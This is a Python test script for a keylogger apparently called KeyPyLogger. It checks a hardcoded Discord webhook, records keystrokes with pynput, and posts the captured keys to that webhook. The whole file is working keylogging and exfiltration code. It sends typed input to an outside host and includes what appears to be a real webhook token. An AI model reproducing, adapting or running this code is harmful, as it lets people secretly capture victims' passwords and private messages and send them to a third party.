#!/usr/bin/env python3
"""
Quick test - bypasses the builder
"""

import sys
import time
from datetime import datetime
from pynput import keyboard
import requests

WEBHOOK_URL = "https://discord.com/api/webhooks/1085179588159733870/4LyiE73KYoDaxv4HpsE9VX9_gmQv7Onk0Lj3DtrKiKkWyAxGoTzcRekHt_b0m_wn5asC"

print("=" * 70)
print("Quick Test - KeyPyLogger")
print("=" * 70)
print("[*] Testing webhook connection...")

# Test 1: Webhook connection
try:
    test_payload = {
        "username": "KeyPyLogger Test",
        "embeds": [{
            "title": "🧪 Test Connection",
            "description": "If you see this, the webhook is working!",
            "color": 3447003,
            "timestamp": datetime.utcnow().isoformat()
        }]
    }

    response = requests.post(WEBHOOK_URL, json=test_payload, timeout=10)

    if response.status_code == 204:
        print("[✓] Webhook test SUCCESS! Check Discord.")
    else:
        print(f"[✗] Webhook test FAILED! Status: {response.status_code}")
        print(f"    Response: {response.text}")
        sys.exit(1)

except Exception as e:
    print(f"[✗] Webhook test FAILED! Error: {e}")
    sys.exit(1)

print("\n[*] Testing keyboard listener...")
print("[*] Type some characters (will be displayed here)")
print("[*] Press ESC to quit")

keys_pressed = []

def on_press(key):
    try:
        if hasattr(key, 'char') and key.char is not None:
            print(f"Key pressed: {key.char}")
            keys_pressed.append(key.char)
        else:
            print(f"Special key: {key}")
            if key == keyboard.Key.esc:
                print("\n[*] ESC pressed, stopping...")
                return False  # Stop listener
    except Exception as e:
        print(f"Error: {e}")

try:
    print("\n[*] Keyboard listener starting...")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

    # Send captured keys to Discord
    if keys_pressed:
        final_payload = {
            "username": "KeyPyLogger Test",
            "embeds": [{
                "title": "⌨️ Captured Keys",
                "description": f"```\n{''.join(keys_pressed)}\n```",
                "color": 5763719
            }]
        }
        response = requests.post(WEBHOOK_URL, json=final_payload, timeout=10)
        if response.status_code == 204:
            print("\n[✓] Captured keys sent to Discord!")
        else:
            print(f"\n[✗] Failed to send keys. Status: {response.status_code}")

    print("\n[✓] Test completed successfully!")

except Exception as e:
    print(f"\n[✗] Keyboard listener FAILED! Error: {e}")
    import traceback
    traceback.print_exc()
    sys.exit(1)
